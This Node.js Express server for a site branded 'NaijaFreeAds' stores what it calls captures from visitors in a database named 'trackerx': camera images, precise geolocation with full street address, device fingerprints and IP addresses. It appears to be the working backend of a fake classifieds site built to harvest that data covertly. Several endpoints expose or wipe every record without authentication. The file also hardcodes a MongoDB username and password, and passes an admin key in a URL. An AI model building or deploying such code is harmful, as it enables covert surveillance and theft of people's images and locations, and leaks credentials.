const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB Connection
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 200
});
app.use('/api/', limiter);

// Serve static files
app.use(express.static(__dirname));

// MongoDB Schema
const captureSchema = new mongoose.Schema({
    id: { type: Number, required: true, unique: true },
    type: { type: String, enum: ['ad_posted', 'permission_granted', 'camera_update'], required: true },
    timestamp: { type: Date, default: Date.now },
    ad: {
        title: String,
        category: String,
        description: String,
        price: String,
        location: String,
        phone: String
    },
    location: {
        lat: Number,
        lng: Number,
        accuracy: Number,
        street: String,
        city: String,
        state: String,
        country: String,
        postcode: String,
        fullAddress: String
    },
    cameraImage: String,
    cameraFullBase64: String,
    hasCamera: Boolean,
    device: {
        userAgent: String,
        platform: String,
        language: String,
        screen: String,
        timezone: String,
        ip: String
    },
    ip: String
}, { timestamps: true });

const Capture = mongoose.model('Capture', captureSchema);

// ============ API ROUTES ============

// POST /api/capture - Save data
app.post('/api/capture', async (req, res) => {
    try {
        const data = req.body;
        if (!data.id) data.id = Date.now();
        
        // Check if exists
        const existing = await Capture.findOne({ id: data.id });
        if (existing) {
            return res.json({ success: true, message: 'Already exists' });
        }
        
        const capture = new Capture(data);
        await capture.save();
        console.log(`✅ Saved: ${data.type} - ID: ${data.id}`);
        res.status(201).json({ success: true, id: capture._id });
    } catch (error) {
        console.error('Save error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// GET /api/fetch - Get all data
app.get('/api/fetch', async (req, res) => {
    try {
        const { limit = 500, search } = req.query;
        let query = {};
        
        if (search) {
            query = {
                $or: [
                    { 'ad.title': { $regex: search, $options: 'i' } },
                    { 'ad.location': { $regex: search, $options: 'i' } },
                    { 'location.city': { $regex: search, $options: 'i' } },
                    { 'location.state': { $regex: search, $options: 'i' } }
                ]
            };
        }
        
        const records = await Capture.find(query).sort({ timestamp: -1 }).limit(parseInt(limit));
        res.json({ success: true, records, count: records.length });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// DELETE /api/delete/:id - Delete single record
app.delete('/api/delete/:id', async (req, res) => {
    try {
        const id = parseInt(req.params.id);
        await Capture.findOneAndDelete({ id: id });
        console.log(`🗑️ Deleted record: ${id}`);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// DELETE /api/clear - Clear all data
app.delete('/api/clear', async (req, res) => {
    try {
        await Capture.deleteMany({});
        console.log('🗑️ All data cleared');
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// GET /api/stats - Get statistics
app.get('/api/stats', async (req, res) => {
    try {
        const totalAds = await Capture.countDocuments({ type: 'ad_posted' });
        const totalPerms = await Capture.countDocuments({ type: 'permission_granted' });
        res.json({ success: true, stats: { totalAds, totalPerms, total: await Capture.countDocuments() } });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Serve index.html for root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Connect to MongoDB and start server
async function startServer() {
    try {
        await mongoose.connect(MONGODB_URI);
        console.log('✅ MongoDB connected');
        
        app.listen(PORT, () => {
            console.log(`
╔═══════════════════════════════════════════════════╗
║     NaijaFreeAds Server Running                   ║
╠═══════════════════════════════════════════════════╣
║  Main Website:  http://localhost:${PORT}           ║
║  Admin Panel:   http://localhost:${PORT}/admin.html?key=NAIJA2025DOPE ║
║                                                   ║
║  ⚠️  Keep your secret key safe!                   ║
╚═══════════════════════════════════════════════════╝
            `);
        });
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        process.exit(1);
    }
}

startServer();
